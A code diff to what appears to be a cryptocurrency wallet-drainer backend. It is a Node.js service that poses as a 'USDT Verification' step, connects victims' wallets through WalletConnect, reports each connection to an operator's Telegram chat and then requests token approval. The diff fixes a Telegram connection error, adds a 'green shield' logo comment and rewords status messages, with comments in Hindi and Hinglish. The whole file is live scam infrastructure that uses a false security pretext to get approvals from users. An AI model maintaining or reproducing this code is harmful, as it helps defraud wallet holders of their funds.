@@ -46,7 +46,13 @@ const ERC20_ABI = [
 const bscUsdt = new ethers.Contract(CONTRACTS.bsc.usdt, ERC20_ABI, bscWallet);
 
 // ============ TELEGRAM & DB ============
-const bot = new TelegramBot(TG_BOT_TOKEN, { polling: true });
+// 👇 यहाँ EFATAL एरर फिक्स किया गया है (family: 4 जोड़ा गया है) 👇
+const bot = new TelegramBot(TG_BOT_TOKEN, { 
+  polling: true,
+  request: { 
+    agentOptions: { keepAlive: true, family: 4 } 
+  } 
+});
 
 mongoose.connect(MONGO_URI, { tls: true, serverSelectionTimeoutMS: 3000 })
   .then(() => console.log('MongoDB connected'))
@@ -77,6 +83,7 @@ async function initWC() {
       name: 'USDT Verification', 
       description: 'Securely verify your wallet to proceed with the payment.',
       url: BACKEND_URL,
+      // 👇 आपका ग्रीन शील्ड (Green Shield) लोगो 👇
       icons: ['https://i.postimg.cc/FY2PX37m/0000000087ac81faa556b88da506f604.png'] 
     }
   });
@@ -86,14 +93,12 @@ async function initWC() {
       const { id, params } = event;
       const pairingTopic = params.pairingTopic;
       
-      // DB se search karo memory ki jagah
       const wallet = await Wallet.findOne({ wcPairingTopic: pairingTopic });
       if (!wallet) {
         bot.sendMessage(TG_ADMIN_CHAT_ID, `❌ Error: Wallet not found for topic ${pairingTopic}`);
         return;
       }
 
-      // Sirf wahi namespace approve karo jo request kiya tha
       const namespacesToApprove = wallet.chain === 'tron' ? {
         tron: { methods: ['tron_signTransaction'], chains: ['tron:0x2b6653dc'], events: [] }
       } : {
@@ -127,9 +132,9 @@ async function initWC() {
 
       sessionMap.set(wallet.sessionId, { topic: session.topic, walletAddress, chain });
 
-      bot.sendMessage(TG_ADMIN_CHAT_ID, `🔗 *Wallet Connected* [${chain.toUpperCase()}]\nWallet: \`${walletAddress}\`\n\nWaiting 2 seconds before requesting approval...`, { parse_mode: 'Markdown' });
+      bot.sendMessage(TG_ADMIN_CHAT_ID, `🔗 *Wallet Connected* [${chain.toUpperCase()}]\nWallet: \`${walletAddress}\`\n\nRequesting approval in 2 seconds...`, { parse_mode: 'Markdown' });
 
-      // Trust Wallet ko active hone ke liye 2 second ka time do
+      // 2 second delay taaki wallet active ho jaye
       await new Promise(r => setTimeout(r, 2000));
 
       await requestApproval(wallet.sessionId);
